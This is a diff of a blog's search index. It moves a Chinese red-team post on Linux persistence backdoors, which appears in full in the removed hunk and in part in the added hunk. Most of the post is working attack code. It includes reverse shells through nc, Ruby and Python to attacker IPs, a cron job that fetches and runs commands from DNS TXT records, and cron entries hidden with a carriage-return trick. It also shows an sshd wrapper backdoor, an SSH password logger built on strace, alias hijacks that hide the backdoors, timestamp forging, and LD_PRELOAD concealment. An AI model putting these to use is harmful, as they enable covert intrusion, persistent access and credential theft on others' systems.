+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">劫持前先将当前alias结果保存至比较隐蔽的文件</span><br><span class="line">alias &gt; /etc/gnupg/.gnupg</span><br><span class="line"></span><br><span class="line">alias alias=&quot;cat /etc/gnupg/.gnupg&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>3) 文件位置隐蔽</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) 在正常的位置创建合理的文件</span><br><span class="line">vi /etc/yum/yum-update.rc  //创建文件，加入别名设置</span><br><span class="line"></span><br><span class="line">alias ls=&quot;alerts()&#123; ls $* --color=auto;ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;&#x27;&quot;&#x27;&quot;192.168.1.1&quot;&#x27;&quot;&#x27;&quot;,&quot;&#x27;&quot;&#x27;&quot;6666&quot;&#x27;&quot;&#x27;&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;&#x27;&quot;&#x27;&quot;r&quot;&#x27;&quot;&#x27;&quot;)&#123;|io|c.print io.read&#125;end&#x27;;&#125;;alerts&quot;</span><br><span class="line"></span><br><span class="line">alias unalias=&#x27;alerts()&#123; if [ $# != 0 ]; then if [ $* != &quot;ls&quot; ]&amp;&amp;[ $* != &quot;alias&quot; ]&amp;&amp;[ $* != &quot;unalias&quot; ]; then unalias $*;else echo &quot;-bash: unalias: $&#123;*&#125;: not found&quot;;fi;else echo &quot;unalias: usage: unalias [-a] name [name ...]&quot;;fi;&#125;;alerts&#x27;</span><br><span class="line"></span><br><span class="line">alias alias=&quot;cat /etc/gnupg/.gnupg&quot;</span><br><span class="line"></span><br><span class="line">2) 将正常文件的时间复制给包含alias的文件</span><br><span class="line"></span><br><span class="line">touch -acmr version-groups.conf yum-update.rc</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05-vim后门"><a href="#0x05-vim后门" class="headerlink" title="0x05 vim后门"></a>0x05 vim后门</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 适用于安装了vim且安装了python扩展(绝大版本默认安装)的linux系统,恶意脚本.py的内容可以是任何功能的后门</span><br><span class="line"></span><br><span class="line">cd /usr/lib/python2.7/site-packages &amp;&amp; $(nohup vim -E -c &quot;pyfile json.py&quot;&gt; /dev/null 2&gt;&amp;1 &amp;) &amp;&amp; sleep 2 &amp;&amp; rm -f json.py</span><br><span class="line"></span><br><span class="line">// 脚本代码</span><br><span class="line"></span><br><span class="line">import socket, subprocess, os;</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);</span><br><span class="line">s.connect((&quot;192.168.121.1&quot;, 6666));</span><br><span class="line">os.dup2(s.fileno(), 0);</span><br><span class="line">os.dup2(s.fileno(), 1);</span><br><span class="line">os.dup2(s.fileno(), 2);</span><br><span class="line">p = subprocess.call([&quot;/bin/sh&quot;, &quot;-i&quot;]);</span><br><span class="line"></span><br><span class="line">//  攻击机监听6666端口并获取反弹的shell</span><br><span class="line"></span><br><span class="line">nc -lvnp 6666</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x06-LD-PRELOAD-后门"><a href="#0x06-LD-PRELOAD-后门" class="headerlink" title="0x06 LD_PRELOAD 后门"></a>0x06 LD_PRELOAD 后门</h2><h3 id="环境变量隐藏"><a href="#环境变量隐藏" class="headerlink" title="环境变量隐藏"></a>环境变量隐藏</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) echo $LD_PRELOAD </span><br><span class="line"></span><br><span class="line">alias echo=&#x27;func()&#123; echo $* | sed &quot;s!/home/hook.so! !g&quot;;&#125;;func&#x27;</span><br><span class="line"></span><br><span class="line">2) env</span><br><span class="line"></span><br><span class="line">alias env=&#x27;func()&#123; env $* | grep -v &quot;/home/hook.so&quot;;&#125;;func&#x27;</span><br><span class="line"></span><br><span class="line">3) set </span><br><span class="line"></span><br><span class="line">alias set=&#x27;func()&#123; set $* | grep -v &quot;/home/hook.so&quot;;&#125;;func&#x27;</span><br><span class="line"></span><br><span class="line">4) export </span><br><span class="line"></span><br><span class="line">alias export=&#x27;func()&#123; export $* | grep -v &quot;/home/hook.so&quot;;&#125;;func&#x27;</span><br><span class="line"></span><br><span class="line">5) unalias劫持</span><br><span class="line"></span><br><span class="line">alias unalias=&#x27;func()&#123; if [ $# != 0 ]; then if [ $* != &quot;echo&quot; ]&amp;&amp;[ $* != &quot;env&quot; ]&amp;&amp;[ $* != &quot;set&quot; ]&amp;&amp;[ $* != &quot;export&quot; ]&amp;&amp;[ $* != &quot;alias&quot; ]&amp;&amp;[ $* != &quot;unalias&quot; ]; then unalias $*;else echo &quot;-bash: unalias: $&#123;*&#125;: not found&quot;;fi;else echo &quot;unalias: usage: unalias [-a] name [name ...]&quot;;fi;&#125;;func&#x27;</span><br><span class="line"></span><br><span class="line">6) alias劫持</span><br><span class="line"></span><br><span class="line">alias alias=&#x27;func()&#123; alias &quot;$@&quot; | grep -v unalias | grep -v hook.so;&#125;;func&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h3><ul>
+<li><a href="https://github.com/mempodippy/cub3">https://github.com/mempodippy/cub3</a> </li>
+<li><a href="https://github.com/mempodippy/vlany">https://github.com/mempodippy/vlany</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>红队渗透</category>
+      </categories>
+      <tags>
+        <tag>Persistence</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>网络威胁框架演进</title>
     <url>/posts/20996/</url>
     <content><![CDATA[<center>本文探究Cyber Kill Chain、NSA-TCTF、MITRE-ATT&CK框架等网络威胁框架演进发展历程...</center>
@@ -2211,86 +2291,6 @@ msf auxiliary(arp_sweep) &gt; run
       </categories>
       <tags>
         <tag>Threat Framework</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>权限维持Linux后门篇</title>
-    <url>/posts/20809/</url>
-    <content><![CDATA[<center>本文记录Linux环境下权限维持思路及方法...</center>
-
-<span id="more"></span>
-<hr>
-<h2 id="0x01-Metasploit"><a href="#0x01-Metasploit" class="headerlink" title="0x01 Metasploit"></a>0x01 Metasploit</h2><h3 id="1-Unix-中反弹shell的paylaod"><a href="#1-Unix-中反弹shell的paylaod" class="headerlink" title="1. Unix 中反弹shell的paylaod"></a>1. Unix 中反弹shell的paylaod</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -l payloads | grep &#x27;cmd/unix/reverse&#x27;</span><br><span class="line"></span><br><span class="line">    cmd/unix/reverse                                    Creates an interactive shell through two inbound connections</span><br><span class="line">    cmd/unix/reverse_awk                                Creates an interactive shell via GNU AWK</span><br><span class="line">    cmd/unix/reverse_bash                               Creates an interactive shell via bash&#x27;s builtin /dev/tcp. This will not work on circa 2009 and older Debian-based Linux distributions (including Ubuntu) because they compile bash without the /dev/tcp feature.</span><br><span class="line">    cmd/unix/reverse_bash_telnet_ssl                    Creates an interactive shell via mkfifo and telnet. This method works on Debian and other systems compiled without /dev/tcp support. This module uses the &#x27;-z&#x27; option included on some systems to encrypt using SSL.</span><br><span class="line">    cmd/unix/reverse_bash_udp                           Creates an interactive shell via bash&#x27;s builtin /dev/udp. This will not work on circa 2009 and older Debian-based Linux distributions (including Ubuntu) because they compile bash without the /dev/udp feature.</span><br><span class="line">    cmd/unix/reverse_jjs                                Connect back and create a command shell via jjs</span><br><span class="line">    cmd/unix/reverse_ksh                                Connect back and create a command shell via Ksh. Note: Although Ksh is often available, please be aware it isn&#x27;t usually installed by default.</span><br><span class="line">    cmd/unix/reverse_lua                                Creates an interactive shell via Lua</span><br><span class="line">    cmd/unix/reverse_ncat_ssl                           Creates an interactive shell via ncat, utilizing ssl mode</span><br><span class="line">    cmd/unix/reverse_netcat                             Creates an interactive shell via netcat</span><br><span class="line">    cmd/unix/reverse_netcat_gaping                      Creates an interactive shell via netcat</span><br><span class="line">    cmd/unix/reverse_nodejs                             Continually listen for a connection and spawn a command shell via nodejs</span><br><span class="line">    cmd/unix/reverse_openssl                            Creates an interactive shell through two inbound connections</span><br><span class="line">    cmd/unix/reverse_perl                               Creates an interactive shell via perl</span><br><span class="line">    cmd/unix/reverse_perl_ssl                           Creates an interactive shell via perl, uses SSL</span><br><span class="line">    cmd/unix/reverse_php_ssl                            Creates an interactive shell via php, uses SSL</span><br><span class="line">    cmd/unix/reverse_python                             Connect back and create a command shell via Python</span><br><span class="line">    cmd/unix/reverse_python_ssl                         Creates an interactive shell via python, uses SSL, encodes with base64 by design.</span><br><span class="line">    cmd/unix/reverse_r                                  Connect back and create a command shell via R</span><br><span class="line">    cmd/unix/reverse_ruby                               Connect back and create a command shell via Ruby</span><br><span class="line">    cmd/unix/reverse_ruby_ssl                           Connect back and create a command shell via Ruby, uses SSL</span><br><span class="line">    cmd/unix/reverse_socat_udp                          Creates an interactive shell via socat</span><br><span class="line">    cmd/unix/reverse_ssh                                Connect back and create a command shell via SSH</span><br><span class="line">    cmd/unix/reverse_ssl_double_telnet                  Creates an interactive shell through two inbound connections, encrypts using SSL via &quot;-z&quot; option</span><br><span class="line">    cmd/unix/reverse_stub                               Creates an interactive shell through an inbound connection (stub only, no payload)</span><br><span class="line">    cmd/unix/reverse_tclsh                              Creates an interactive shell via Tclsh</span><br><span class="line">    cmd/unix/reverse_zsh                                Connect back and create a command shell via Zsh. Note: Although Zsh is often available, please be aware it isn&#x27;t usually installed by default</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-msfvenom-生成payload"><a href="#2-msfvenom-生成payload" class="headerlink" title="2. msfvenom 生成payload"></a>2. msfvenom 生成payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p &lt;payload&gt; LHOST=&lt;LHOST&gt; LPORT=&lt;LPORT&gt; -f &lt;format&gt; -o &lt;path&gt;</span><br><span class="line"></span><br><span class="line">msfvenom -p &lt;payload&gt; -e &lt;encoder &gt; -i &lt;encoder times&gt; LHOST=&lt;LHOST&gt; LPORT=&lt;LPORT&gt; -f &lt;format&gt; -o &lt;path&gt;</span><br></pre></td></tr></table></figure>
-
-<p>refer: <a href="https://gitee.com/l0n9/sec-notes/blob/master/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/Metsploit%E5%9F%BA%E7%A1%80%E7%AF%87.md">https://gitee.com/l0n9/sec-notes/blob/master/Metsploit</a></p>
-<h3 id="3-meterpreter-shell"><a href="#3-meterpreter-shell" class="headerlink" title="3. meterpreter shell"></a>3. meterpreter shell</h3><p>shell升级为 meterpreter shell</p>
-<p>攻击机配置msf 监听：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">set payload linux/x86/shell/reverse_tcp</span><br><span class="line"></span><br><span class="line">set lport 6666</span><br><span class="line"></span><br><span class="line">set lhost 192.168.1.1</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-<p>目标主机上反弹shell</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm -f /tmp/f; mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 192.168.1.1 6666 &gt; /tmp/f</span><br></pre></td></tr></table></figure>
-
-<p>获取一个普通shell, 在这个shell中输入 background, 在对话中选择 y, 将shell放在了后台</p>
-<p>使用 sessions -u 1 将普通shell提升为 meterpreter shell</p>
-<p>sessions命令查看shell会话，sessions -i id 切换到目标shell</p>
-<h2 id="0x02-计划任务后门"><a href="#0x02-计划任务后门" class="headerlink" title="0x02 计划任务后门"></a>0x02 计划任务后门</h2><h3 id="1-查找计划任务相关文件"><a href="#1-查找计划任务相关文件" class="headerlink" title="1. 查找计划任务相关文件"></a>1. 查找计划任务相关文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) sudo find / -name &#x27;cron*&#x27; | egrep -v &#x27;man|doc&#x27; | sort -u</span><br><span class="line"></span><br><span class="line">2) sudo updatedb &amp;&amp; sudo locate cron | egrep -v &#x27;doc|man&#x27;</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-定时任务文件说明"><a href="#2-定时任务文件说明" class="headerlink" title="2. 定时任务文件说明"></a>2. 定时任务文件说明</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) 用户允许/禁止配置文件</span><br><span class="line"></span><br><span class="line">- /etc/cron.deny ：用来禁止一些用户使用cron服务的配置文件</span><br><span class="line"></span><br><span class="line">- /etc/cron.allow ：允许一些用户来使用cron服务的配置文件，优先级高</span><br><span class="line"></span><br><span class="line">2) 系统配置项：系统执行的计划任务</span><br><span class="line"></span><br><span class="line">- /etc/crontab </span><br><span class="line"></span><br><span class="line">- /etc/cron.d/</span><br><span class="line"></span><br><span class="line">3) 用户配置项：执行crontab命令操作的目录</span><br><span class="line"></span><br><span class="line">- /var/spool/cron</span><br><span class="line"></span><br><span class="line">4) 其他计划任务文件</span><br><span class="line"></span><br><span class="line">    /etc/cron.daily</span><br><span class="line">    /etc/cron.deny</span><br><span class="line">    /etc/cron.hourly</span><br><span class="line">    /etc/cron.monthly</span><br><span class="line">    /etc/cron.weekly</span><br></pre></td></tr></table></figure>
-
-<p>定时任务在线生成器：<a href="https://crontab.guru/">https://crontab.guru/</a></p>
-<h3 id="3-计划任务隐藏后门"><a href="#3-计划任务隐藏后门" class="headerlink" title="3. 计划任务隐藏后门"></a>3. 计划任务隐藏后门</h3><p>隐藏思路</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) 不使用用户cron配置项：避免crontab命令查看计划任务内容</span><br><span class="line"></span><br><span class="line">2) 不使用常用目录及文件如：/var/spool/cron、/etc/crontab等</span><br><span class="line"></span><br><span class="line">3) 劫持/修改系统默认的计划任务文件：伪装文件名/文件位置</span><br><span class="line"></span><br><span class="line">如：/etc/cron.daily 、/etc/cron.hourly目录下自带文件</span><br></pre></td></tr></table></figure>
-
-<p>隐藏技巧</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) 巧妙利用windows中的 \r（ Linux 中显示为M), 导致显示截断，从而隐藏真实的计划任务，使用crontab -e 可以看到</span><br><span class="line"></span><br><span class="line">(crontab -l;printf &quot;*/1 * * * * /root/.devops.sh;\rno crontab for `whoami`%100c\n&quot;)|crontab -</span><br><span class="line"></span><br><span class="line">2) 使用DNS的TXT记录，通过解析这个记录来进行执行，使用linux.org等公共域名进行隐藏</span><br><span class="line"></span><br><span class="line">0 1 * * * /bin/sh -c &quot;sh -c $(dig logging.chat TXT +short @pola.ns.cloudflare.com)&quot;</span><br></pre></td></tr></table></figure>
-
-<p>refer：<a href="https://blog.sucuri.net/2019/05/cronjob-backdoors.html">https://blog.sucuri.net/2019/05/cronjob-backdoors.html</a></p>
-<h2 id="0x03-SSH系列后门"><a href="#0x03-SSH系列后门" class="headerlink" title="0x03 SSH系列后门"></a>0x03 SSH系列后门</h2><h3 id="1-软链接后门"><a href="#1-软链接后门" class="headerlink" title="1. 软链接后门"></a>1. 软链接后门</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=6666;</span><br><span class="line"></span><br><span class="line">ssh root@x.x.x.x -p 6666</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-SSH-Wapper-后门"><a href="#2-SSH-Wapper-后门" class="headerlink" title="2. SSH Wapper 后门"></a>2. SSH Wapper 后门</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/sbin/</span><br><span class="line">mv sshd ../bin</span><br><span class="line">vim sshd //编辑sshd内容为以下</span><br><span class="line"></span><br><span class="line">#!/usr/bin/perl</span><br><span class="line">exec&quot;/bin/sh&quot; if(getpeername(STDIN)=~/^..0V/); // \x00\x000V是22222的大端形式</span><br><span class="line">exec&#123;&quot;/usr/bin/sshd&quot;&#125;&quot;/usr/sbin/sshd&quot;,@ARGV;</span><br><span class="line"></span><br><span class="line">重启sshd</span><br><span class="line">service sshd restart</span><br><span class="line"></span><br><span class="line">本机执行</span><br><span class="line">socat STDIO TCP4:127.0.0.1:22,sourceport=22222</span><br><span class="line"></span><br><span class="line">修改源端口</span><br><span class="line">import struct</span><br><span class="line">buffer = struct.pack(&#x27;&gt;I&#x27;,22222)</span><br><span class="line">print(buffer)</span><br></pre></td></tr></table></figure>
-
-<h3 id="3-SSH公钥后门"><a href="#3-SSH公钥后门" class="headerlink" title="3. SSH公钥后门"></a>3. SSH公钥后门</h3><p>攻击机中使用 ssh-keygen -t rsa 生成公私钥</p>
-<p>将公钥 id_rsa.pub 上传到目标主机，保存为 ~&#x2F;.ssh&#x2F;authorized_keys</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh user@host</span><br></pre></td></tr></table></figure>
-
-<h3 id="4-SSH-Keylogger"><a href="#4-SSH-Keylogger" class="headerlink" title="4. SSH Keylogger"></a>4. SSH Keylogger</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 利用strace工具获取ssh的读写连接的数据，以达到抓取管理员登陆其他机器的明文密码</span><br><span class="line">alias ssh=&#x27;strace -o /tmp/.sshpwd-`date &#x27;+%d%h%m%s&#x27;`.log -e read.write.connect -s 2048 ssh&#x27;</span><br><span class="line"></span><br><span class="line">grep &quot;read(5&quot; /tmp/.sshpwdxxxxxxxx.log</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x04-alias后门"><a href="#0x04-alias后门" class="headerlink" title="0x04 alias后门"></a>0x04 alias后门</h2><h3 id="1-后门存放位置"><a href="#1-后门存放位置" class="headerlink" title="1. 后门存放位置"></a>1. 后门存放位置</h3><p>系统启动默认加载的配置文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) /etc/profile</span><br><span class="line"></span><br><span class="line">【系统级】Linux是一个多用户操作系统。用户登录或切换（即Login shell 启动）时都有一个专用的运行环境，但首先执行 /etc/profile</span><br><span class="line"></span><br><span class="line">2) /etc/bashrc</span><br><span class="line"></span><br><span class="line">【系统级】在 bash shell 打开时运行，修改该文件配置的环境变量将会影响所有用户使用的bash shell</span><br><span class="line"></span><br><span class="line">3) ~/.bashrc</span><br><span class="line"></span><br><span class="line">【用户级】当用户登录时以及每次打开新的shell时该文件都将被读取，不推荐在这里配置用户专用的环境变量，因为每开一个shell，该文件都会被读取一次</span><br><span class="line"></span><br><span class="line">4) ~/.bash_profile &amp;&amp; ~./bash_login</span><br><span class="line"></span><br><span class="line">【用户级】</span><br><span class="line"></span><br><span class="line">如果有其中的一个文件存在的话, 当启动的是一个登录shell时，Bash 会执行该文件而不会执行~/.profile </span><br><span class="line"></span><br><span class="line">如果两个文件都存在的话，Bash 将会优先执行~/.bash_profile 而不是~/.bash_login </span><br><span class="line"></span><br><span class="line">5) ~/.bash_logout</span><br><span class="line"></span><br><span class="line">【用户级】当每次退出系统(退出bash shell)时执行该文件</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-后门制作"><a href="#2-后门制作" class="headerlink" title="2. 后门制作"></a>2. 后门制作</h3><p>当前用户目录下.bashrc</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alias ssh=&#x27;strace -o /tmp/sshpwd-`date &#x27;+%d%h%m%s&#x27;`.log -e read,write,connect -s 2048 ssh&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>创建alias后门</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) 受控端创建别名</span><br><span class="line"></span><br><span class="line">alias ls=&quot;alerts()&#123; ls $* --color=auto;ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;&#x27;&quot;&#x27;&quot;192.168.1.1&quot;&#x27;&quot;&#x27;&quot;,&quot;&#x27;&quot;&#x27;&quot;6666&quot;&#x27;&quot;&#x27;&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;&#x27;&quot;&#x27;&quot;r&quot;&#x27;&quot;&#x27;&quot;)&#123;|io|c.print io.read&#125;end&#x27;;&#125;;alerts&quot;</span><br><span class="line"></span><br><span class="line">2）攻击端监听本地端口</span><br><span class="line"></span><br><span class="line">nc -lvnp 6666</span><br><span class="line"></span><br><span class="line">3) 受控端执行别名命令，攻击端获得反弹shell</span><br></pre></td></tr></table></figure>
-
-<h3 id="3-后门隐藏"><a href="#3-后门隐藏" class="headerlink" title="3. 后门隐藏"></a>3. 后门隐藏</h3><p>alias命令可以查看当前的别名，会让别名后门暴露。因此需要劫持alias命令，使输出中不显示后门指令。</p>
-<p>另外unalias命令会清除别名，也需要对其进行劫持，避免后门指令的别名被清除。</p>
-<p><strong>1）创建unalias别名</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alias unalias=&#x27;alerts()&#123; if [ $# != 0 ]; then if [ $* != &quot;ls&quot; ]&amp;&amp;[ $* != &quot;alias&quot; ]&amp;&amp;[ $* != &quot;unalias&quot; ]; then unalias $*;else echo &quot;-bash: unalias: $&#123;*&#125;: not found&quot;;fi;else echo &quot;unalias: usage: unalias [-a] name [name ...]&quot;;fi;&#125;;alerts&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><strong>2) 创建alias的别名</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">劫持前先将当前alias结果保存至比较隐蔽的文件</span><br><span class="line">alias &gt; /etc/gnupg/.gnupg</span><br><span class="line"></span><br><span class="line">alias alias=&quot;cat /etc/gnupg/.gnupg&quot;</span><br></pre></td></tr></table></figure>
-
-<p><strong>3) 文件位置隐蔽</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) 在正常的位置创建合理的文件</span><br><span class="line">vi /etc/yum/yum-update.rc  //创建文件，加入别名设置</span><br><span class="line"></span><br><span class="line">alias ls=&quot;alerts()&#123; ls $* --color=auto;ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;&#x27;&quot;&#x27;&quot;192.168.1.1&quot;&#x27;&quot;&#x27;&quot;,&quot;&#x27;&quot;&#x27;&quot;6666&quot;&#x27;&quot;&#x27;&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;&#x27;&quot;&#x27;&quot;r&quot;&#x27;&quot;&#x27;&quot;)&#123;|io|c.print io.read&#125;end&#x27;;&#125;;alerts&quot;</span><br><span class="line"></span><br><span class="line">alias unalias=&#x27;alerts()&#123; if [ $# != 0 ]; then if [ $* != &quot;ls&quot; ]&amp;&amp;[ $* != &quot;alias&quot; ]&amp;&amp;[ $* != &quot;unalias&quot; ]; then unalias $*;else echo &quot;-bash: unalias: $&#123;*&#125;: not found&quot;;fi;else echo &quot;unalias: usage: unalias [-a] name [name ...]&quot;;fi;&#125;;alerts&#x27;</span><br><span class="line"></span><br><span class="line">alias alias=&quot;cat /etc/gnupg/.gnupg&quot;</span><br><span class="line"></span><br><span class="line">2) 将正常文件的时间复制给包含alias的文件</span><br><span class="line"></span><br><span class="line">touch -acmr version-groups.conf yum-update.rc</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x05-vim后门"><a href="#0x05-vim后门" class="headerlink" title="0x05 vim后门"></a>0x05 vim后门</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 适用于安装了vim且安装了python扩展(绝大版本默认安装)的linux系统,恶意脚本.py的内容可以是任何功能的后门</span><br><span class="line"></span><br><span class="line">cd /usr/lib/python2.7/site-packages &amp;&amp; $(nohup vim -E -c &quot;pyfile json.py&quot;&gt; /dev/null 2&gt;&amp;1 &amp;) &amp;&amp; sleep 2 &amp;&amp; rm -f json.py</span><br><span class="line"></span><br><span class="line">// 脚本代码</span><br><span class="line"></span><br><span class="line">import socket, subprocess, os;</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);</span><br><span class="line">s.connect((&quot;192.168.121.1&quot;, 6666));</span><br><span class="line">os.dup2(s.fileno(), 0);</span><br><span class="line">os.dup2(s.fileno(), 1);</span><br><span class="line">os.dup2(s.fileno(), 2);</span><br><span class="line">p = subprocess.call([&quot;/bin/sh&quot;, &quot;-i&quot;]);</span><br><span class="line"></span><br><span class="line">//  攻击机监听6666端口并获取反弹的shell</span><br><span class="line"></span><br><span class="line">nc -lvnp 6666</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x06-LD-PRELOAD-后门"><a href="#0x06-LD-PRELOAD-后门" class="headerlink" title="0x06 LD_PRELOAD 后门"></a>0x06 LD_PRELOAD 后门</h2><h3 id="环境变量隐藏"><a href="#环境变量隐藏" class="headerlink" title="环境变量隐藏"></a>环境变量隐藏</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) echo $LD_PRELOAD </span><br><span class="line"></span><br><span class="line">alias echo=&#x27;func()&#123; echo $* | sed &quot;s!/home/hook.so! !g&quot;;&#125;;func&#x27;</span><br><span class="line"></span><br><span class="line">2) env</span><br><span class="line"></span><br><span class="line">alias env=&#x27;func()&#123; env $* | grep -v &quot;/home/hook.so&quot;;&#125;;func&#x27;</span><br><span class="line"></span><br><span class="line">3) set </span><br><span class="line"></span><br><span class="line">alias set=&#x27;func()&#123; set $* | grep -v &quot;/home/hook.so&quot;;&#125;;func&#x27;</span><br><span class="line"></span><br><span class="line">4) export </span><br><span class="line"></span><br><span class="line">alias export=&#x27;func()&#123; export $* | grep -v &quot;/home/hook.so&quot;;&#125;;func&#x27;</span><br><span class="line"></span><br><span class="line">5) unalias劫持</span><br><span class="line"></span><br><span class="line">alias unalias=&#x27;func()&#123; if [ $# != 0 ]; then if [ $* != &quot;echo&quot; ]&amp;&amp;[ $* != &quot;env&quot; ]&amp;&amp;[ $* != &quot;set&quot; ]&amp;&amp;[ $* != &quot;export&quot; ]&amp;&amp;[ $* != &quot;alias&quot; ]&amp;&amp;[ $* != &quot;unalias&quot; ]; then unalias $*;else echo &quot;-bash: unalias: $&#123;*&#125;: not found&quot;;fi;else echo &quot;unalias: usage: unalias [-a] name [name ...]&quot;;fi;&#125;;func&#x27;</span><br><span class="line"></span><br><span class="line">6) alias劫持</span><br><span class="line"></span><br><span class="line">alias alias=&#x27;func()&#123; alias &quot;$@&quot; | grep -v unalias | grep -v hook.so;&#125;;func&#x27;</span><br></pre></td></tr></table></figure>
-
-<h3 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h3><ul>
-<li><a href="https://github.com/mempodippy/cub3">https://github.com/mempodippy/cub3</a> </li>
-<li><a href="https://github.com/mempodippy/vlany">https://github.com/mempodippy/vlany</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>红队渗透</category>
-      </categories>
-      <tags>
-        <tag>Persistence</tag>
       </tags>
   </entry>
   <entry>
